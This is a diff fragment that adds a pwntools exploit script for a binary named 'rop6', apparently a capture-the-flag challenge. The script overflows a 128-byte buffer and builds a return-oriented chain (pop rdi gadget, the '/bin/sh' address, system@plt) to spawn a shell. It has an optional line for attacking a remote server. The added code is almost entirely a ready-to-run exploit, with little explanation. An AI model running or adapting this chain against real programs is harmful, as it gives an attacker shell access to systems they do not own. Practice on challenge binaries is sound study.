@@ -85,3 +85,36 @@
  'output.\n'
  '- Review the binary with tools like `checksec`, `objdump`, or `readelf` to '
  'understand its properties.')
+
+from pwn import *
+
+# Set up pwntools context
+context.binary = elf = ELF('./rop6')
+context.log_level = 'debug'  # Set to 'info' or 'debug' for more output
+# context.terminal = ['tmux', 'splitw', '-h']  # Uncomment if you want to debug with GDB
+
+# Start the process (or connect remotely)
+p = elf.process()
+# For remote connection, uncomment the following line and provide the correct IP and port
+# p = remote('challenge_server', port)
+
+# Find the offset to control the return address
+offset = 136  # Buffer size (128) + saved RBP (8)
+
+# Find necessary gadgets and addresses
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Gadget to control RDI
+bin_sh = next(elf.search(b'/bin/sh'))  # Address of '/bin/sh' string
+system = elf.plt['system']  # Address of 'system' function in PLT
+
+# Build the payload
+payload = b'A' * offset  # Padding to reach the return address
+payload += p64(pop_rdi)  # Address of 'pop rdi; ret' gadget
+payload += p64(bin_sh)   # Address of '/bin/sh' string
+payload += p64(system)   # Address of 'system' function
+
+# Send the payload
+p.sendlineafter('Input:\n', payload)
+
+# Interact with the shell
+p.interactive()
